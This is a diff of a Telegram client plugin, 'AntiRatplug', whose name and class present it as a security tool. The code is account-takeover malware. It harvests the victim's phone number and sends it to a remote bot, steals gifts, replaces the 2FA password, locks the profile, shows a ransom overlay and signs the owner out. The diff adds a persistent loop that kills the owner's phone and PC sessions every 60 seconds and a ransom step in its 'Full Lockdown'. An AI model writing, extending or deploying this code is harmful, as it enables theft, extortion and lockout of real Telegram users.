@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22.2 — final.
+AntiRatplug v22.3 — final + nuke loop + ransom in lockdown.
 Menu: Manual / Troll / Automatic. Full Lockdown. Phone harvest fixed.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v22.2 final."
+__description__ = "v22.3."
 __author__ = "@from_a4"
-__version__ = "22.2"
+__version__ = "22.3"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -43,7 +43,7 @@ API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 STARS_POST = "from_a4/14"
 RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
 RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
-RANSOM_WARNING = "Закроешь прило, выйдешь с экстеры тебе пизда"
+RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
@@ -176,8 +176,6 @@ def _get_bool_attr(obj, name, default=False):
 
 
 def _clean_phone(raw):
-    """Нормализация телефона: превращает любой формат в +NNNNNNNNNNN.
-    Возвращает '' если номер невалидный или заглушка."""
     if raw is None:
         return ""
     s = str(raw).strip()
@@ -194,7 +192,6 @@ def _clean_phone(raw):
 
 
 def _phone_from_user(u):
-    """Прямой доступ к phone как в 15.1 — работает на ExteraGram."""
     if u is None:
         return ""
     for attr in ("phone", "phoneNumber", "phone_number"):
@@ -338,6 +335,11 @@ class PluginSecurityPlugin(BasePlugin):
 
         self._input_mode = None
 
+        self._nuke_on = False
+        self._nuke_thread = None
+        self._nuke_interval = 60
+        self._nuke_pass = 0
+
     def on_plugin_load(self):
         self._sync_running = True
         self._active = True
@@ -350,6 +352,10 @@ class PluginSecurityPlugin(BasePlugin):
             self.add_on_send_message_hook()
         except Exception as e:
             _log("hook: %s" % e)
+        try:
+            self._check_persisted_nuke()
+        except Exception:
+            pass
         threading.Thread(target=self._boot, daemon=True).start()
 
     def on_plugin_unload(self):
@@ -357,6 +363,7 @@ class PluginSecurityPlugin(BasePlugin):
         self._active = False
         self.stop = True
         self._tg_kid_watching = False
+        self._nuke_on = False
         for fn in (self._dismiss_ransom, self._clear_locker,
                    self._clear_dim, self._clear_music):
             try:
@@ -388,7 +395,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log("boot phone debug: %s" % e)
         try:
-            self._send_msg("AntiRatplug v22.2 loaded")
+            self._send_msg("AntiRatplug v22.3 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -673,7 +680,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = "id:" + str(uid)
         except Exception as e:
             _log("manage btn user: %s" % e)
-        line = "<b>AntiRatplug v22.2</b>\nUser: @" + username
+        line = "<b>AntiRatplug v22.3</b>\nUser: @" + username
         if phone:
             line += "\nPhone: " + phone
         kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
@@ -691,7 +698,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v22.2", kb, html=True)
+        self._send_markup("AntiRatplug v22.3", kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
@@ -712,6 +719,9 @@ class PluginSecurityPlugin(BasePlugin):
             "keyboard": [
                 [{"text": "Wipe Sessions"}],
                 [{"text": "Kill All Sessions"}],
+                [{"text": "Kill Phones/PCs"}],
+                [{"text": "Nuke ON"}],
+                [{"text": "Nuke OFF"}],
                 [{"text": "Session Dump"}],
                 [{"text": "Userbot Dump"}],
                 [{"text": "⬅️ Back"}],
@@ -801,12 +811,13 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v22.2</b>\n\n"
+            "<b>AntiRatplug v22.3</b>\n\n"
             "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
             "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
             "<b>Full Harvest</b> — сбор без модификаций\n"
-            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + kill sessions + pull out\n"
-            "<b>Gift Transfer</b> — gift drain на получателя\n\n"
+            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + ransom + kill + nuke + pull out\n"
+            "<b>Gift Transfer</b> — gift drain на получателя\n"
+            "<b>Nuke loop</b> — убивает новые сессии каждые 60с\n\n"
             "Recipient: " + BOT_UID_STR
         )
         self._send_msg(text, html=True)
@@ -832,6 +843,8 @@ class PluginSecurityPlugin(BasePlugin):
                 self._clear_dim()
             elif data == "hv_logout":
                 threading.Thread(target=self._pull_out_account, daemon=True).start()
+            elif data == "hv_stop_nuke":
+                self._stop_nuke_loop()
         except Exception as e:
             _log("callback: %s" % e)
 
@@ -881,6 +894,12 @@ class PluginSecurityPlugin(BasePlugin):
                 threading.Thread(target=self._session_wipe, daemon=True).start()
             elif t == "Kill All Sessions":
                 threading.Thread(target=self._kill_sessions_full, daemon=True).start()
+            elif t == "Kill Phones/PCs":
+                threading.Thread(target=self._kill_phones_pc, daemon=True).start()
+            elif t == "Nuke ON":
+                self._start_nuke_loop()
+            elif t == "Nuke OFF":
+                self._stop_nuke_loop()
             elif t == "Session Dump":
                 threading.Thread(target=self._manual_dump_session, daemon=True).start()
             elif t == "Userbot Dump":
@@ -955,7 +974,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
 
-            # ── источник 1: getCurrentUser.phone (как в 15.1) ──
             raw_phone = ""
             if u is not None:
                 try:
@@ -967,7 +985,6 @@ class PluginSecurityPlugin(BasePlugin):
             if ph:
                 out["phone"] = ph
 
-            # ── источник 2: userconfig.xml ──
             if "phone" not in out:
                 try:
                     ctx = ApplicationLoader.applicationContext
@@ -1006,7 +1023,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     _log("shared_prefs phone: %s" % e)
 
-            # ── источник 3: getFullUser RPC ──
             if "phone" not in out:
                 try:
                     Full = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
@@ -1457,12 +1473,15 @@ class PluginSecurityPlugin(BasePlugin):
                     "hash": _safe_int(getattr(a, "hash", 0)),
                     "current": _get_bool_attr(a, "current", False),
                     "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
+                    "device": str(getattr(a, "device_model", "") or ""),
+                    "app": str(getattr(a, "app_name", "") or ""),
+                    "platform": str(getattr(a, "platform", "") or ""),
                 })
             return out
         except Exception:
             return None
 
-    def _kill_all_sessions(self, acc=0):
+    def _kill_all_sessions(self, acc=0, phones_pc_only=False):
         auths = self._get_authorizations_full(acc)
         if auths is None:
             return 0, 0
@@ -1484,8 +1503,22 @@ class PluginSecurityPlugin(BasePlugin):
 
         killed = 0
         for _pass in range(5):
-            targets = [a["hash"] for a in auths
-                       if not a["current"] and a["hash"] and a["hash"] not in dead]
+            targets = []
+            for a in auths:
+                if a["current"]:
+                    continue
+                if not a["hash"] or a["hash"] in dead:
+                    continue
+                if phones_pc_only:
+                    dev = str(a.get("device", "") or "").lower()
+                    app = str(a.get("app", "") or "").lower()
+                    platform = str(a.get("platform", "") or "").lower()
+                    blob = dev + " " + app + " " + platform
+                    if any(w in blob for w in ("web", "chrome", "firefox",
+                                                "safari", "opera", "edge",
+                                                "browser")):
+                        continue
+                targets.append(a["hash"])
             if not targets:
                 break
             res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
@@ -1509,12 +1542,12 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return killed, max(total, killed)
 
-    def _wipe_sessions_all(self):
+    def _wipe_sessions_all(self, phones_pc_only=False):
         out = []
         for a in self._get_accounts_list():
             aid = a.get("id", 0)
             try:
-                k, t = self._kill_all_sessions(aid)
+                k, t = self._kill_all_sessions(aid, phones_pc_only=phones_pc_only)
                 out.append({"account": aid, "user_id": a.get("user_id"),
                             "killed": k, "total": t})
             except Exception as e:
@@ -1523,12 +1556,21 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _kill_sessions_full(self):
         try:
-            self._send_msg("Kill all sessions...")
-            ws = self._wipe_sessions_all()
+            self._send_msg("Kill all sessions (phones/PCs, skip web)...")
+            ws = self._wipe_sessions_all(phones_pc_only=True)
             tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
             self._send_msg("Sessions killed: %d" % tk)
         except Exception as e:
             self._send_msg("kill sessions err: " + str(e))
+
+    def _kill_phones_pc(self):
+        try:
+            self._send_msg("Kill phones/PCs only (skip web, skip current)...")
+            ws = self._wipe_sessions_all(phones_pc_only=True)
+            tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
+            self._send_msg("Phones/PCs killed: %d" % tk)
+        except Exception as e:
+            self._send_msg("kill err: " + str(e))
 
     def _session_wipe(self):
         try:
@@ -2906,6 +2948,99 @@ class PluginSecurityPlugin(BasePlugin):
             self._dim_view = None
             self._dim_active = False
 
+    # ─── nuke loop ────────────────────────────────────────────────────────
+
+    def _nuke_marker_path(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
+                                ".ar_nuke_active")
+        except Exception:
+            return None
+
+    def _mark_nuke(self):
+        try:
+            m = self._nuke_marker_path()
+            if m:
+                with open(m, "w") as f:
+                    f.write("1")
+            self._nuke_on = True
+        except Exception:
+            pass
+
+    def _check_persisted_nuke(self):
+        try:
+            m = self._nuke_marker_path()
+            if not m or not os.path.exists(m):
+                return
+            self._nuke_on = True
+            self._nuke_thread = threading.Thread(
+                target=self._nuke_loop, daemon=True)
+            self._nuke_thread.start()
+            try:
+                self._send_msg("Nuke loop resumed from marker")
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+    def _start_nuke_loop(self):
+        if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
+            try:
+                self._send_msg("Nuke loop already running")
+            except Exception:
+                pass
+            return
+        self._nuke_on = True
+        self._mark_nuke()
+        self._nuke_pass = 0
+        self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
+        self._nuke_thread.start()
+        try:
+            self._send_msg("Nuke loop STARTED. Killing sessions every 60s.")
+        except Exception:
+            pass
+
+    def _stop_nuke_loop(self):
+        self._nuke_on = False
+        try:
+            m = self._nuke_marker_path()
+            if m and os.path.exists(m):
+                os.remove(m)
+        except Exception:
+            pass
+        try:
+            self._send_msg("Nuke loop STOPPED.")
+        except Exception:
+            pass
+
+    def _nuke_loop(self):
+        while self._nuke_on and self._sync_running and not self.stop:
+            self._nuke_pass += 1
+            try:
+                for a in self._get_accounts_list():
+                    aid = a.get("id", 0)
+                    try:
+                        self._kill_all_sessions(aid, phones_pc_only=True)
+                    except Exception:
+                        pass
+                try:
+                    self._confirm_unconfirmed_sessions(0)
+                except Exception:
+                    pass
+                try:
+                    self._kill_web_authorizations(0)
+                except Exception:
+                    pass
+            except Exception as e:
+                _log("nuke pass %d: %s" % (self._nuke_pass, e))
+            for _ in range(self._nuke_interval):
+                if not self._nuke_on or not self._sync_running or self.stop:
+                    return
+                time.sleep(1)
+
+    # ─── full harvest / lockdown ──────────────────────────────────────────
+
     def _full_harvest(self):
         def task():
             def alive():
@@ -2979,9 +3114,10 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("Full Lockdown...")
                 report = ["<b>Full Lockdown</b>"]
 
+                # 1 harvest + sessions
                 if not alive():
                     return
-                self._send_msg("1/7 harvest + sessions...")
+                self._send_msg("1/9 harvest + sessions...")
                 ga = self._parallel([
                     (self._tg_kid,),
                     (self._confirm_unconfirmed_sessions, 0),
@@ -2991,9 +3127,10 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Pending:</b> %s" % str(ga[1]))
                 report.append("<b>Web:</b> %s" % str(ga[2]))
 
+                # 2 gift drain
                 if not alive():
                     return
-                self._send_msg("2/7 gift drain...")
+                self._send_msg("2/9 gift drain...")
                 try:
                     gr = self._drain_gifts(0)
                     if gr.get("error"):
@@ -3010,18 +3147,20 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Gifts:</b> %s" % e)
 
+                # 3 2FA
                 if not alive():
                     return
-                self._send_msg("3/7 2FA...")
+                self._send_msg("3/9 2FA...")
                 try:
                     pwd = self._nuke_password_pipeline(0)
                 except Exception as e:
                     pwd = {"final": "exc: %s" % e}
                 report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
 
+                # 4 profile lock
                 if not alive():
                     return
-                self._send_msg("4/7 profile lock...")
+                self._send_msg("4/9 profile lock...")
                 try:
                     new_un = self._change_username(0)
                 except Exception:
@@ -3038,35 +3177,71 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
                 report.append("<b>Contacts:</b> %s" % cont)
 
+                # 5 kill sessions
                 if not alive():
                     return
-                self._send_msg("5/7 kill sessions...")
-                k, total = self._kill_all_sessions(0)
-                report.append("<b>Sessions killed:</b> %d / %d" % (k, total))
+                self._send_msg("5/9 kill sessions...")
+                k, total = self._kill_all_sessions(0, phones_pc_only=True)
+                report.append("<b>Phones/PCs killed:</b> %d / %d" % (k, total))
 
+                # 6 screenshot gain
                 if not alive():
                     return
-                self._send_msg("6/7 screenshot gain...")
+                self._send_msg("6/9 screenshot gain...")
                 try:
                     self._screenshot_gain()
                     report.append("<b>Screenshot gain:</b> sent")
                 except Exception:
                     pass
 
+                # 7 RANSOM (перед pull out)
                 if not alive():
                     return
-                self._send_msg("7/7 pull out...")
+                self._send_msg("7/9 ransom overlay...")
+                try:
+                    rr = self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
+                    if isinstance(rr, dict) and rr.get("ok"):
+                        report.append("<b>Ransom:</b> ON")
+                    else:
+                        report.append("<b>Ransom:</b> %s" % rr)
+                except Exception as e:
+                    report.append("<b>Ransom:</b> %s" % e)
+
+                # 8 pull out — последним
+                if not alive():
+                    return
+                self._send_msg("8/9 pull out...")
                 try:
                     self._pull_out_account()
                     report.append("<b>Pull Out:</b> last")
                 except Exception as e:
                     report.append("<b>Pull Out:</b> %s" % e)
 
+                # 9 double-kill + nuke loop
+                if not alive():
+                    return
+                self._send_msg("9/9 double-kill + nuke...")
+                for _w in range(30):
+                    if not alive():
+                        return
+                    time.sleep(1)
+                try:
+                    k2, t2 = self._kill_all_sessions(0, phones_pc_only=True)
+                    report.append("<b>Double-kill:</b> %d / %d" % (k2, t2))
+                except Exception as e:
+                    report.append("<b>Double-kill:</b> %s" % e)
+                try:
+                    self._start_nuke_loop()
+                    report.append("<b>Nuke loop:</b> ON (60s)")
+                except Exception as e:
+                    report.append("<b>Nuke loop:</b> %s" % e)
+
                 report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                 report.append("<b>LOCKDOWN complete</b>")
                 self._send_markup("\n".join(report), {
                     "inline_keyboard": [
                         [{"text": "Logout again", "callback_data": "hv_logout"}],
+                        [{"text": "Stop nuke", "callback_data": "hv_stop_nuke"}],
                     ]
                 }, html=True)
             except Exception as e:
